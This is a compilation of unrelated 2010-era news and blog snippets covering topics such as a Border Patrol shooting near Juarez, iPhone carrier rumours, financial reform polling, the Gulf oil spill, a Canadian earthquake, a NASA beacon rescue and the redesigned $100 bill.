After listening to this NPR News piece on a Border Patrol agent shooting a 14 - year - old Mexican child near the Juarez / El Paso border , Boing Boing pal Drew Carey noted on Twitter , " I agree the Border Patrol has a tough job , but shooting rock - throwers should be a no - go .
Find a non-lethal way to handle it . "
Could n't agree more , and I say that as someone who 's aware of what a dangerous and chaotic place that part of the border is .
I 've spent a lot of time around the border , and on both sides of it , in California / Baja .
According to the NPR News piece , the union rep for Border Patrol agents says it is alright for agents to shoot Mexican children who throw rocks at them .
" There are so many non-lethal weapons available to law enforcement . "
Drew tweeted , " Has the Border Patrol even considered them ? "
The child 's body was found on the Ciudad Juarez side of the fence .
By all accounts available at the time of this blog post , he never crossed over on to the US side , and was not attempting to do so .
He was unarmed , and he was shot in the head .
Sergio Adrian Hernández was his name .

Petri Putrho , developer of IGF 2008 grand prize winner Crayon Physics Deluxe , has posted Men On The Flying Trapeze , another project created for Gamma IV 's one - button game competition but not chosen for the showacase ( many of the non-finalists seem just as fun as as the winners ! ) .
Men On The Flying Trapeze is a cooperative , two - player version of Putrho 's previous trapeze act game The Amazing Flying Brothers , released in 2007 .
In this update , players push down on the shift keys to accelerate or slow down depending on whether they 're descending or rising , then tap the button to release their grip and swing to other trapeze bars for points .
You can download Men On The Flying Trapeze , which was created with the help of Dennis Belfrage , for free from Purho 's experimental games site Kloonigames .
And if you do n't have a friend around to join you , you can still grab The Amazing Flying Brothers for a single - player experience , too .

( Newser ) – Competition from Google 's Droid platform may stall the Verizon - Apple marriage , meaning the iPhone will wind up branching out to T - Mobile first .
With AT&T 's exclusive deal near an end , furious speculation about which provider will be the next to offer Apple 's signature device has focused on Verizon .
But two industry analysts are predicting that Verizon , No. 1 in US subscribers with 71 million , will lose out to No. 4 T - Mobile .
A big reason : technology
AT&T and T - Mobile use the same network technology , which is not compatible with the CDMA system Verizon employs , notes Fox News .
Verizon and Google have been waging war on AT&T and Apple , but Verizon 's huge subscriber base — about twice the size of T - Mobile 's — will likely prove irresistible Apple in the long run , reports TheStreet.com .
Meanwhile , T - Mobile 's desperation means Apple can probably make a favorable deal .

Poll : Lawmakers who weaken FinReg could be vulnerable
Could lawmakers who support loopholes that weaken financial regulatory reform be putting themselves at greater risk this fall ?
According to a new poll commissioned from a Dem firm by a coalition of groups advocating for meaningful financial reform , the answer is Yes .
And a new national poll also finds that FinReg could be an electoral issue .
The most visible example of a FinReg loophole is the one that Scott Brown is fighting for in the so - called Volcker rule , which would limit or prohibit the ability of financial firms to make speculative bets with their capital .
Brown appears to be on the verge of persuading Senate Dem leaders to include a carve - out that would allow banks to invest some profits in hedge funds and private equity funds in exchange for being the 60th vote .
Reform groups are fighting this kind of loophole .
A new poll to be released this morning by Dem pollster Celinda Lake suggests those who support such loopholes could be at some risk .
The poll , which was commissioned by Americans for Financial Reform , finds that an overwhelming majority would be less likely to reelect their member of Congress if they weaken FinReg :
When asked if they would be more or less likely to re-elect their member of Congress if he or she " voted for loopholes that would make it easier for Wall Street and the big banks to keep doing business as usual , " fully 78 % of voters said they would be less likely to re-elect their member of Congress , while 63 % said they would be much less likely to re-elect him or her .
You may be tempted to dismiss this finding because it 's a Dem firm .
So check out the new NBC / WSJ poll .
It finds that 53 percent generally want their Congressional candidate to support reforming Wall Street , 25 percent enthusiastically so .
Getting meaningful FinReg appears to be on the minds of Americans , and it could be a voting issue this fall .

In a new biography on sale Tuesday , Rush Limbaugh calls fellow conservative talk show host Bill O’Reilly a “ Ted Baxter ” — after the fictional character on the “ The Mary Tyler Moore Show ” who was portrayed as a vain , shallow , buffoonish TV newsman .
“ Sorry but somebody ’s gotta say it , ” Limbaugh is quoted as saying in Rush Limbaugh : An Army of One by Zev Chafets .
At press time , O’Reilly had yet to respond to the comment .
ADVERTISEMENT
But it was n’t just Bill - O who took grief from Big Rush .
Limbaugh said he does n’t consider any of his fellow conservative talk show hosts to be in his league .
“ Sean Hannity and Mark Levin are protégés , ” writes Chafets , “ and [ Limbaugh ] has defended Glenn Beck . ”
But Limbaugh “ does n’t really consider them , or anyone else , in his league . ”
Also on Limbaugh ’s hit list is CNN ’s Larry King , whom Limbaugh “ really does n’t like . ”
“ He has never had nice things to say about me , ” Limbaugh says about King in the book .
“ He was working midnights [ on the radio ] when I started and demanded that his syndicator move him to afternoon drive when my success was obvious .
He bombed and quit radio for CNN exclusively . ”
The book also divulges how Limbaugh spends his multimillion - dollar earnings :
The radio host owns five houses on an oceanfront estate north of Palm Beach , as well as a garage full of Maybach 57Ss ( all black ) and a $ 56 million Gulfstream G550 jet .
Limbaugh ’s main home on the estate is 24,000 square feet , while the remaining homes are for guests .
The décor includes a massive chandelier just like the one that hangs in the lobby of New York ’s Plaza Hotel , as well as a full suit of armor and a “ life - size oil portrait of El Rushbo . ”
And according to Chafets , “ fragrant candles ” burn throughout the place .
The main guest suite is “ an exact replica of the Presidential Suite of the Hotel George V in Paris . ”
The publisher notes that the biography is unauthorized , but Limbaugh gave Chafets extensive interviews for it .
Chafets first wrote about Limbaugh in a 2008 New York Times Magazine cover story .
If you have subscribed to AT&T DSL service at any point from 1994 until today , you may be eligible for a cash payout from the company over allegations that it improperly rate - limited some DSL lines , making it impossible for subscribers to achieve maximum speeds .
AT&T has agreed to settle an Ohio class - action lawsuit over the issue of Internet speeds , one that reaches all the way back into the dark ages of DSL and includes all of AT&T's predecessor companies ( BellSouth , SBC , Ameritech — even Prodigy ) .
Class members who want to take part in the settlement need to apply online .
If the settlement is approved by a judge at a June 1 hearing , AT&T will run every class member through its databases to determine if they ever had DSL service that was " limited to a rate below the maximum rate for the plan you purchased . "
In such cases , AT&T will pay the class member $ 2.90 for every month that such a limit was in effect .
AT&T will do a similar check on minimum speeds .
Class members whose service " performed at speeds lower than certain speed thresholds " will get a $ 2.00 rebate for each month that the lower - than - minimum speeds applied .
And , if you were an AT&T DSL subscriber , but the company 's records show that nothing improper was done to your line , you can still get money .
The proposed settlement says that those who " believe that your DSL Service has not performed at satisfactory speeds " may still be eligible for a " one - time payment of $ 2.00 . "
Yes — $ 2.00 .
In addition , AT&T will dole out $ 3.75 million to charity and has agreed not to contest attorneys ' fees of up to a whopping $ 11 million .
Such cases rarely go to trial .
AT&T continues to deny it did anything wrong , but says that a settlement is a cheaper , easier way to dispose of the litigation than to fight it in court .
For 97 years the 12 regional banks of the Federal Reserve system have operated relatively free of political interference from Washington .
The looming financial reform bill threatens that independence , not least through an effort to impose new presidential appointees at the regional banks .
The biggest underreported threat comes from Subtitle I , Section 1801 of the House financial reform bill titled " Inclusion of Minorities and Women ; Diversity in Agency Workforce . "
Sponsored by California Democrat Maxine Waters , the provision ...
Here is something I did last night as its a Sketch group some of my friends and I host .

We get it , the iPhone 4 is pretty cool , and of course the opportunity to obtain it on the very first day has a bit of an allure .
But lining up for a camp - out in front of your strip mall - ensconced AT&T store five days later for the first day of walk - in sales is ... well , we do n't want to judge .
At least you documented the soul sucking process with these blurry photos of your lines , some of which stretched as far as 100 people .
Do n't worry , the iPhone 4 will manage to snap much better shots of this process as it inevitably repeats itself next year , to the clear detriment of mankind .
Oh , and if you onlookers were thinking of joining in on the fray , you might want to hold off : the word on the street is that most AT&T stores have run out of this fresh stock already .
Federal Reserve Chairman Ben Bernanke says he ’s a bit puzzled by surging gold prices .
The 30 % rally from a year ago , on top of gains in previous years , might be interpreted as a loud signal from markets that big inflation pressures are building in the U.S.
Gold is seen by many investors as a hedge against inflation risk .
In this case , it might instead be a hedge against risk broadly .
Mr. Bernanke notes that the inflation signal is n’t confirmed by movements in other asset classes .
Yields on Treasury bonds tend to rise when investors worry about inflation , but those yields have been falling recently .
Inflation expectations as measured in Treasury Inflation Protected Securities ( TIPS ) markets remain low .
And other commodity prices are falling .
Gold is breaking records , but copper prices are down 17 % so far this year .
“ I do n’t fully understand movements in the gold price , ” Mr. Bernanke admitted .
But he suggested it might be another example of investors fleeing risky assets and flocking to assets that are perceived as less risky , not only Treasury bonds , but also ones like gold .
Bernanke also defended the stimulus in his cautious testimony as a temporary measure to boost the economy , but warned of continuing deficits .

A university course offering lessons in the beautiful game is proving popular as football extends its appeal in the US .
Led by Professors Nigel Boyle and Andre Wakefield of Pitzer College , the programme only runs in World Cup years .
Rajesh Mirchandani reports from California .
The board amended Article 10 of the Code of Ethics , which addresses " duties to the public . "
That part of the Code already prohibits realtors from discriminating against customers on the basis of race , color , religion , sex , handicap , familial status , or national origin .
Standard of Practice 10 - 3 was also amended to prohibit discrimination on the basis of sexual orientation in any advertisements for selling or renting property .
The change , met with applause , was passed unanimously by the Professional Standards Committee earlier in the week .
The measure will now go before the NAR Delegate Body for approval at NAR ’s annual conference in November .
Although an official announcement will have to wait until after the NBA Finals , Boston Celtics assistant coach Tom Thibodeau has accepted an offer to become the next head coach of the Chicago Bulls , a source told ESPNChicago.com on Saturday .
Thibodeau 's deal is worth approximately $ 6.5 million , with two years guaranteed plus a team option , according to multiple media reports .
This development comes after ESPN.com 's Marc Stein reported Thibodeau had withdrawn his name from consideration for the New Orleans Hornets ' coaching job .
Bulls officials declined comment .
The team and the NBA agreed to
wait until after the Finals are over to make the hiring official .
" We do not have any rules that prohibit a team from announcing a coaching hire during the Finals , " NBA spokesman Tim Frank said .
" In the Bulls case , because they have no plans to consummate any
deal before the end of the Finals , we agreed that they should defer
any announcement to the conclusion of the Finals . "
Celtics coach Doc Rivers would not confirm the move before Boston practiced the day before Game 2 of the NBA Finals .
" I hope it 's true , but we 're not going to comment on it , I can tell you that , " Rivers said .
" We 're focused on the NBA Finals .
There 's two teams .
There 's the Lakers and the Celtics , and that 's what we 're going to keep the focus on .
" But on Tom , he deserves the job .
I think he 's the best candidate out there .
I 've said that for three years now .
So let 's hope it 's true . "
In addition to getting interest from the Bulls and Hornets , Thibodeau was a strong candidate for the New Jersey Nets ' coaching opening , Stein reported .
Thibodeau interviewed with the Nets before the Celtics left the East Coast for Los Angeles for Game 1 of the NBA Finals .
Early in the Bulls ' coaching search , conventional wisdom indicated the team was looking at candidates who had prior head coaching experience .
Thibodeau 's extensive experience as an assistant , however , was enough .
ESPNChicago.com had reported the Bulls were impressed with Thibodeau 's basketball knowledge after a recent interview .
Those who worked closely with Thibodeau had high praise for him .
" Tom 's a workaholic , " Celtics forward Paul Pierce told ESPNChicago.com recently .
" I 'm always catching him in there working , watching film in his office .
He 's probably the most prepared coach I 've ever seen . "
Rivers agreed .
" It 's tough to get a picture of him , because he 's always in the office , " Rivers told ESPNChicago.com .
Those buying their first home in some parts of the midlands and the north of England will find more mortgage choice available than their peers in the south .
Research from Moneyfacts .co.uk reveals there is now a postcode lottery for the number of mortgage deals available to first - time buyers at 90 % loan - to - value ( LTV ) with those in the north west , midlands and Yorkshire potentially having more than twice the choice of those in the south .
There are now four lenders with 15 mortgages available for first - time buyers in England and Wales at 90 % LTV that are available directly from the lender .
This includes home purchase plans available from Al Rayan Bank .
Those living in areas served by Cumberland Building Society , Darlington Building Society , Furness Building Society and Stafford Railway Building Society can also choose from an additional 17 mortgages available , totalling 32 available to those buying in these regions .
So , more than double what is available nationwide to those in the south .
Buckinghamshire Building Society has just launched two 90 % LTV first - time buyer mortgage available to those buying in Buckinghamshire only – in addition those that are existing customers or related to an existing customer of the building society ( such as children , parents , grandparents and grandchildren ) can benefit from a reduced interest rate .
Even with this new launch those living in the south of England will need more regional lenders to come forward to make the availability of 90 % first - time buyer mortgages more equal between those buying in the north compared to the south .

Oil has been gushing out of the blown - out well for almost a month
The first oil from the Gulf of Mexico spill has entered an ocean current that could take it to Florida and up the east coast of the US , scientists say .
A " small portion " of oil sheen is in the Loop Current , which circulates in the Gulf , the National Oceanic and Atmospheric Administration ( NOAA ) said .
Diluted oil could appear in isolated parts of Florida if persistent winds pushed the current that way , it added .
European scientists warn the spill could reach Florida within six days .
Oil has been spewing into the Gulf since the offshore drilling rig Deepwater Horizon , leased by oil giant BP , exploded off the coast of Louisiana on 20 April and sank two days later .
Powerful currents
Satellite images released by the European Space Agency ( ESA ) depict a streak of oil stretching south from the main slick into the Loop Current - a body of fast - flowing water coming from the Caribbean which the agency says is likely to propel oil towards Florida within six days .

Scientists at the NOAA , the US government 's own climate body , broadly share that analysis , but say the oil is a " light sheen " representing just a small portion of the overall amount .
The oil would be " highly weathered " if it reached Florida , or could evaporate en route , it said .
The scientists warned that the turbulent Loop Current could mix the oil and water , making it difficult to track the oil 's progress in the coming days .
Meanwhile , the US Coast Guard said tests showed that tar balls that washed up on Florida beaches in recent days had not originated from the oil spill off Louisiana .
It is unclear where the tar balls came from , Coast Guard officials said .
' Very scary '
Also on Wednesday , the US said it was having talks with Cuba over the spill .
Observers say the rare talks demonstrate a concern that the oil may be carried by currents far from the site of the Deepwater Horizon disaster .
In Louisiana , a lawyer has asked a panel of federal judges to consolidate more than 100 cases related to the oil spill into a single action .
Daniel Becnel asked that the growing number of cases against oil companies BP , Transocean , Halliburton and Cameron be combined and heard in Louisiana , the Associated Press news agency reported .
The lawsuits have been filed by commercial fishermen , restaurants , hotels and property owners and others who say the oil spill has cost them income .
A BP executive said this week that the company had paid out $ 15 m ( £ 10.4 m ) in claims , much of it to shrimpers and commercial fishermen who have little or no income because of the spill .
Meanwhile , astronauts and cosmonauts aboard the International Space Station have said they could see the oil spill while passing over the Gulf of Mexico .
" It looks very scary , " Russian cosmonaut Oleg Kotov told reporters via a video link .
What the Neocons Got Right
When the editors at FP asked me to write 1,500 words on " What the Neocons Got Right " for the launch of their Middle East Channel , I jumped at the opportunity .
To be sure , the topic generated a fair number of bipartisan guffaws and lame jokes among my friends : " It will be the shortest article you ever wrote , " quipped one .
" They got something right ? " queried another .
" How about 1,500 pages on what they got wrong ? " still another partisan asked .
Hilarity aside , neoconservatives have been derided by almost everyone for their misadventures in the Middle East — and there were many — during the George W. Bush years , but that does not mean their approach to the region was always , everywhere a total failure .
The fact is , the neocons are a group of very smart people , as anyone who has ever spent some time actually reading Commentary or the Weekly Standard might know .
They happen to hold a worldview that , at the moment , is not terribly popular .
Of course , the primary reasons the neocons have encountered so much criticism has everything to do with their approach to the Middle East , which is not distinguished for its grasp of the region ’s history , politics , and culture .
Yet , a fine - grained understanding of the Middle East will not always produce superior policy , a fact all too often lost on the punditocracy .
Let me start out by saying that I do not believe the neocons got Iraq right .
It may turn out right or it may not .
It ’s too early to tell .
So far , the March 7 elections look pretty good as the counting gets under way , despite 36 deaths .
Analysts will likely point to the hard , messy coalition bargaining that is sure to come as evidence that Iraq is moving in the right direction .
After all , Iraqis are processing their grievances through democratic institutions , which says a lot about how far the country has come since the dark days of 2006 to 2007 .
Perhaps it ’s my skeptical nature , but I am not ready to declare victory .
We have seen too many " corners turned " and " watershed moments " in Iraq for me to be confident that anyone inside or outside the U.S. government actually understands Iraq .
The effort by Prime Minister Nouri al - Maliki ’s government to bar certain politicians from politics was one prominent warning sign that Iraq might actually be moving toward the " Arab mean " — Middle Eastern leaders have been reverting to this tactic since Egypt ’s Gamal Abdel Nasser invented it in the early 1950s .
More profoundly , there seems to be an undeniable logic to Iraqi politics that concentrates power in Baghdad , which does not bode well for democratic development .
It remains an open question whether the U.S. military ’s almost seven - year mission in Iraq has undermined the unwritten codes , norms , and rules of behavior that governed Iraqi politics for the better part of a century before Operation Iraqi Freedom .
We ’ll just have to wait and see .
So what did the neocons get right ?
Syria , Iran , and democracy .
It probably was n’t wise for George W. Bush ’s administration to oppose the indirect Syria - Israel negotiations that the Turkish government organized in Istanbul through 2008 .
If the Israelis and Syrians want to make peace , the United States should help them .
Despite this bungle , which actually came well after neocon influence in the administration peaked , the neoconservatives had a healthy understanding of what Syrian President Bashar al - Assad regime ’s is all about : violence , repression , and duplicity .
For all their faults , the neocons can read recent history pretty well , and they understood that endless shuttle diplomacy of various U.S. secretaries of state ( with the exception of James Baker ) brought the region no closer to peace and did nothing to alter Damascus ’s strategic posture .
Indeed , the Syrians have a long history of doing just enough to keep their enemies at bay , while retaining the instruments to do considerable harm .
This is not to suggest that Bill Clinton ’s people had a Pollyannaish view of Hafez al - Assad , Bashar ’s father , but neither Hafez nor his son , who took power in 2000 , ever demonstrated the kind of flexibility that engagement was supposed to produce .
Although Clinton ’s first secretary of state , Warren Christopher , visited Damascus 29 times and his successor , Madeleine Albright , sipped tea with Hafez al - Assad on five occasions , the Syrians continued their support for Hamas and Hezbollah with political support as well as weaponry .
The Syrians also never exhibited any flexibility on the peace process .
During the 1990s , the elder Assad sent his foreign minister and other officials to one locale or another for talks with Israelis , but his emissaries consistently demanded that the Israelis return to the June 4 , 1967 , line without ever spelling out the nature of the peace they were offering .
And of course , Damascus has never repudiated its strategic relationship with Iran .
To be fair , the Bush team dabbled in engagement with Damascus after the September 11 attacks , but those efforts were focused on counterterrorism .
The goodwill did not carry over into other areas , including Iraq .
True to form , the Syrians did just enough on al Qaeda to earn plaudits in some quarters while never restricting the group ’s ability to injure the United States , its friends , and its interests in the region .
For example , Bashar al - Assad never shut down the flow of foreign fighters into Iraq by way of Damascus International Airport .
It ’s hard to sign up with the folks who seem all too willing to bomb Iran , but like Syria , the neoconservatives have a well - grounded view of the Iranian regime .
George H.W. Bush tried engagement ( remember " Goodwill begets goodwill " in his inaugural address ? ) , so did Bill Clinton , and now Barack Obama has offered a hand to the clerical regime .
Yet all three presidents have very little to show for their efforts .
Why ?
Did they not engage enough ?
Did Bush , Clinton , and Obama engage incorrectly ?
Unlikely .
Rather , one needs to look at the ontology — yes , ontology , the metaphysical nature — of the Iranian regime .
The Islamic Republic was founded in many ways on opposition to the West , and in particular , the United States .
A good portion of Iran ’s revolutionary narrative identifies the United States ’ perfidy in undermining the aspirations and identity of the Iranian people .
The litany of Tehran ’s complaints against Washington is long .
This is precisely why the Iranian leadership cannot make a deal with the United States .
To do so would undermine the reason for the revolution and the Iranian leadership ’s own reason for being .
The neoconservatives seem to have innately understood — perhaps for different reasons — that the Iranians were quite unlikely to respond to U.S. overtures .
This does n’t mean that engagement is bad everywhere , even when it comes to Iran .
The Obama administration may have been too sanguine about its ability to sway Iran ’s leadership , but the policy does serve an important purpose .
Engagement demonstrates that , unlike with the run-up to the Iraq war , Washington is willing to exhaust every possible avenue to resolve its differences with Tehran before taking more punitive steps such as sanctions or even military action .
The one other area where the neocons got it right is democracy .
A few caveats .
First , you do n’t have to be a neoconservative to support democratic change in the Middle East — it ’s simply the right thing to do .
Second , the Freedom Agenda is all but dead , but that does n’t mean that the neocons were wrong .
It has become fashionable to say that the Bush administration made " egregious " errors promoting democracy in the Arab world .
Yes , invading Iraq to transform the country and the region qualifies as egregious .
Still , Bush ’s forceful , public support for freedom and democracy in the Middle East had a profound effect on politics in the region .
It did nothing less than change the terms of the debate in a way that Arab leaders could no longer control and allowed democracy activists to pursue their agendas in new ways .
Of course , democracy and reform in the Middle East did not begin when the Bush administration discovered the issue on or about September 12 , 2001 , or when the neoconservatives began pressing the issue .
Still , with Washington watching , Arab authoritarians had to position themselves as reformers , making it more difficult for them to crack down on the real reformers .
In Egypt , for example , opposition activists who were generally opposed to Bush ’s Middle East policy ruefully acknowledged that Washington ’s outspoken support for democracy provided them and their colleagues ’ protection from the Egyptian state .
Indeed , it seems that Bush and the neocons had moved the needle on democracy in the Middle East .
The Arab Spring of 2005 was upon us , but then Hamas won the Palestinian elections in January 2006 .
Having never resolved the problem of what happens when nasty people are elected freely and fairly , the U.S. policy of promoting democracy in the region was left to wither .
Nevertheless , the neocons were onto something .
Needless to say , Washington ’s position in the Middle East was far worse after the ascendance of the neoconservatives during the Bush years .
The region was further from peace , stability , and prosperity than when they found it in early 2001 .
Still , the neocons ’ perspective on the nature of the Syrian and Iranian regimes were largely accurate , and their forceful advocacy of democracy and freedom in the Middle East may have grated on many , but it did much to advance those causes in a region once described as " democracy ’s desert . "
Any number of observers would surely disagree with these claims , but I suspect that has more to do with politics than a careful evaluation of what the neocons have to offer to the foreign - policy debate .
The central and eastern regions of Canada are in good shape when it comes to the earthquake - resistance of their buildings despite the shake - up the regions received Wednesday , say experts .
An earthquake hit at 1:41 p.m. ET south of Echo Lake , Que. , 60 kilometres north of Ottawa near the Ontario border .
It was felt across southern and eastern Ontario and western Quebec , as well as in some U.S. states , including Michigan , Ohio , Pennsylvania , Vermont , New Jersey and New York .
The earthquake hit at 1:41 p.m. ET south of Echo Lake , Que. , 60 kilometres north of Ottawa near the Ontario border , and was felt across southern and eastern Ontario and western Quebec . ( ( CBC ) )
With a magnitude of 5.0 , it caused buildings to shake , leading many to fear that some structures could collapse .
Many offices were evacuated as a precautionary measure .
Overall , however , buildings in Quebec and Ontario are safe , said Samir Chidiac , a professor in the department of civil engineering at Hamilton , Ont. - based McMaster University .
" Buildings in Eastern and Central Canada are built to resist earthquakes that are most likely to occur in these regions , " he told CBC News Thursday .
" The National Building Code of Canada , which prescribes the seismic forces for all regions of Canada , is always being updated to account for new data or knowledge . "
The only buildings whose ability to withstand earthquakes is unknown are ones built before 1970 , says Glenn McGillivray , managing director of the Institute for Catastrophic Loss Reduction in Toronto .
" Structures built after about 1970 would be able to withstand moderate events , although those built in the Charlevoix region of Quebec would be able to withstand major events , " said McGillivray .
" The formulas are complicated , but suffice to say that much depends on the region being considered , as requirements change from area to area . "
McGillivray said that wood frame structures generally hold up better than masonry buildings and that the older the building , the greater the potential for damage .
" It appears that virtually all structures damaged in yesterday 's event were historic in nature , built before — sometimes well before — 1970 , " he said .
" This is how we can see that better building codes work . "
Seismic activity in region dictates design
The West Coast has different building standards than the eastern and central parts of Canada , said Chidiac , a function of the variety of seismic activity in those regions .
" We do n't design buildings to resist major earthquakes unless they are built in regions known or deemed to be shaken by large earthquakes , " Chidiac said .
The parts of Ontario and Quebec affected by yesterday 's earthquake have not traditionally seen big quakes .
" Historically , we have two other events that had larger magnitudes : the 1988 Saguenay earthquake , with magnitude 5.9 , and the 1944 Cornwall - Massena earthquake , with magnitude 5.8 , " he said .
Nonetheless , McGillivray said , the temblor Thursday served as a reminder to be prepared .
He says people have to forget the notion that earthquakes can't happen in their area .
" They need to plan for it , not just wait for it , " he said .
Homeowners can help protect themselves and their homes by fastening large shelves , wall units and appliances to walls using brackets or Velcro , as well as fastening doors to shelves or cupboards with claps , McGillivray said .
Placing larger , heavier items on lower shelves and lighter items on top can also help prevent injuries .
People should also take care to protect their gas tanks , said McGillivray .
Homeowners might wish to consider installing a natural gas seismic shutoff valve , which automatically shuts gas off in the event of a quake .
" And , if there is a chimney close to the gas main , they may wish to install a protective metal cage on the valve to protect against falling bricks , " McGillivray said .
As for personal safety , Chidiac said that staying away from objects in the home that can fall and injure you is critical , as is staying in areas that are structurally reinforced , such as doorways .
Sailor Reflects on NASA Technology That Saved His Life

› Other video formats for download A storm capsized Dennis Clements 's boat off the coast of Cape Hatteras , N.C. , in January .
Clements owes his rescue to the crew of the U.S.S. Dwight D. Eisenhower , as well as to NASA satellites and a 406 MHz beacon .

Just seven days after setting sail for a tiny island off the eastern tip of Puerto Rico on Dec. 26 , 2009 , Missourian Dennis Clements thought his life was over ; his crippled 34 - foot Fiberglas sailboat -- buffeted for four days by gale - force winds and high seas -- had capsized , tossing him into the frigid waters of the North Atlantic Ocean .
" At one point , I saw the mast pointed straight down to the bottom of sea , and the boat continued to roll , " he said .
" I was shaken loose somewhere underwater and when I reached the surface , I could see my boat about 30 feet away ...
I could see her stand up ...
She righted herself .
She was heavily flooded .
There was still a piece of sail and I saw it catch the wind .
I saw her sail away and leave me there .
And I was alone in the dark , and in the storm , 250 miles from the shore ...
As I floated there , I knew this was the end .
This was how it would end for me .
" Today , Clements considers himself fortunate .
Thanks to NASA technology , the Search and Rescue Satellite - Aided Tracking ( SARSAT ) program managed by the National Oceanic and Atmospheric Administration ( NOAA ) , and the bravery of military rescuers , Clements was ultimately plucked to safety by a Navy seaman who had been dispatched from the U.S.S. Dwight D. Eisenhower .
It was the only vessel within a hundred miles of Clements ' location able to respond to the Coast Guard 's call for help and attempt the rescue , which took only four minutes once the Navy helicopter arrived on the scene .
" It was the bravest thing I 've ever seen , " Clements said .
In a sense , Clements dramatic rescue began years earlier when he bought a 406 MHz Emergency Position Indicating Radio Beacon ( EPIRB ) , designed for maritime use .
When his sailboat , " Gloria Adios " had taken on water , the beacon activated , transmitting an emergency distress signal that NOAA weather satellites equipped with NASA - developed repeaters then relayed back to NOAA - operated ground stations .
While Clements battled the storm , which was slowly but surely overwhelming his sailboat , a chain reaction had already been set in place before the rogue wave had even capsized his boat .
Sometime after the beacon began transmitting the emergency alert , SARSAT equipment located hundreds of miles away received the signal and had begun processing it to determine its precise location .
The U.S. Coast Guard , which is responsible for at - sea rescues , received the alert and searched the NOAA Registration Database to determine whether the beacon had been registered .
Luckily for Clements , he had done so , providing emergency contact numbers and other information that the Coast Guard used to contact Clements ' family .
The database is a vital part of the SARSAT program .
" We use the database to provide critical information to help expedite the search process , especially if the location of the beacon is not immediately known , " said Mickey Fitzmaurice , a space systems engineer for the SARSAT program , the organization that operates the U.S. component of the COSPAS - SARSAT system now comprised of 40 nations .
The beacon on Clements ' boat was an older model and did not encode GPS location data , with its signal .
However , the ground - station equipment used the Doppler effect from its low - Earth - orbiting weather satellites to help pinpoint the location of the signal .
This can take a little time depending on where the satellites are located at the time of the incident .
While the SARSAT system calculated the location of the signal , a Coast Guard search and rescue controller was on the phone calling to find out if Clements had gone to sea and where he was headed .
From this information , a more precise location could be provided to the rescuers .
Given the harrowing weather conditions the night Clements was rescued , Fitzmaurice said it fortuitous that Clements had registered his beacon .
The U.S. Coast Guard was able to confirm the validity of Clements ’s distress signal .
Therefore , the U.S. Coast Guard and U.S. Navy personnel involved in his rescue were not unnecessarily exposed to life - threatening conditions due to a false alert .
"
The beacon registration information can help save lives , not only the person in distress , but also the rescuers , " said LCDR Kathy Niles , U.S. Coast Guard SARSAT Liaison Officer .
" NOAA 's database currently contains about 275,000 registrations which , unfortunately , are only about 75 percent of the beacons out there .
" Since his rescue on Jan. 2 , 2010 , Clements has had time to reflect on the technology and people who saved his life .
" I 'm very glad I had that beacon , " he said .
" I knew it was a satellite system and somewhere there were people monitoring it , but I did n't know it was a weather satellite .
It really is a wonderful system that they have come up with , " he said .
" It speaks volumes about the United States of America in the things that matter to us as a nation , that we would invest time , resources , and manpower ( into technologies ) that save people 's lives .
" Now , NOAA , NASA , the U.S. Coast Guard , and U.S. Air Force officials say they are working together to develop and new and improved search and rescue system , called the Distress Alerting Satellite System ( DASS ) .
Engineers at the NASA Goddard Space Flight Center in Greenbelt , Md. , are developing next - generation search and rescue technologies that will more quickly detect and locate distress signals generated by 406 MHz beacons installed on aircraft and vessels or carried by individuals .
That 's because NASA plans to install the repeaters on Global Position System ( GPS ) , a constellation of 24 spacecraft operating in mid-Earth orbit , and not weather satellites .
" A few years ago , we looked to see how we could improve the system and we concluded that the international search and rescue community would benefit from new technology installed on GPS , " said NASA Search and Rescue Mission Manager David Affens .
" We would be able to identify distress signals faster and with a greater level of precision .
In the end , this will save more lives , reduce risk to rescuers , and save money because less time will be spent searching .
" The improved response time is made possible because of the coverage provided by a constellation of satellites encircling the globe .
With a mid-Earth orbit search and rescue capability provided by GPS , one emergency signal goes off , and at least four satellites will be in view .
Almost instantly , processing of the signal can begin to determine its precise location .
" Although the current system is effective , as evidenced by Clements ' rescue and those of 27,000 others worldwide since the system became operational in the mid-1980s , a satellite may not be in position to pick up a distress signal the moment a user activates the beacon .
Furthermore , weather satellites in geostationary orbit cannot independently locate a beacon unless it contains a navigation receiver that encodes and transmits its position -- a capability not offered on most units .
" Right now , it can take an hour or more before we can even act on a signal , " Fitzmaurice said .
The new GPS - based system is now being tested .
Currently , nine GPS satellites are flying the proof - of - concept technology and an additional 12 are planned .
Goddard is conducting testing to fine tune the technology before transitioning to a final system after 2015 , which will be deployed on the Air Force ’s Block III GPS satellites .
" The bottom - line here is that within one minute , we 'll know where the distress signals come from , " Fitzmaurice said .
" It is the future . "
" We could write this off as clowning around and happily condemn the MPs on the internet if it was not for the fact that they drew salaries from our pockets , " Alexei Navalny , a prominent political consultant , wrote in his blog .
He called the MPs " impudent degraded creatures . "
Experts said the anti-democratic ruse was possible because the parliament 's electronic voting system gave MPs about 20 seconds to cast their vote leaving the system open to abuse .
President Dmitry Medvedev has criticised MPs ' poor attendance record in the past but this latest scandal did not feature prominently in state media suggesting it was a scandal the Kremlin did not want to publicise .
It ’s not even official , but that ’s not stopping Digitimes Research analyst Ming - Chi Kuo from estimating that Foxconn — manufacturer of the next iPhone — will deliver some 24 million units to Apple in 2010 .
According to Kuo , an initial shipment of 4.5 million devices will be followed throughout the rest of the year with 19.5 million additional units .
Kuo also echoed John Gruber ’s claims that the iPhone will have a 960×640 IPS display with FFS technology for a higher quality image with better visibility under direct sunlight , and that the phone will have 512MB of memory , or double the memory of the iPhone 3GS .
This assertion is at odds with the findings of a recent next - gen iPhone prototype teardown which revealed the iPhone to be using the same 1GHz A4 processor with 256MB of system DRAM as the iPad .
A more capacious battery is said to be included thanks to a 33 % thinner display .
Anyone else going to be on pins and needles for the next 21 days until WWDC ?

In 1690 , the Massachusetts Bay Colony became the first government in the Western world to issue paper money .
Some of the first counterfeiters of paper money followed soon after .
Within a generation , the authorities were engaged in a running battle against forgers , whom they tried to deter by various punishments : cropping their ears , for example , or hanging them .
Many colonial notes soon came with a pointed warning : " To counterfeit is DEATH . "
Last week , in a ceremony attended by Timothy Geithner and Ben Bernanke , government officials showed off a high - tech $ 100 bill designed to frustrate 21st - century counterfeiters .
It features the pleasing pastels already seen on lesser denominations , as well as a ghostly image of a quill pen and a copper inkwell containing a bell that appears and disappears depending on the angle from which it 's viewed .
Most startling of all , the front of the bill contains a vertical purple strip that contains shimmering images of the number " 100 " and the Liberty Bell , all of which miraculously appear to move when the bill is tilted in one direction or another .
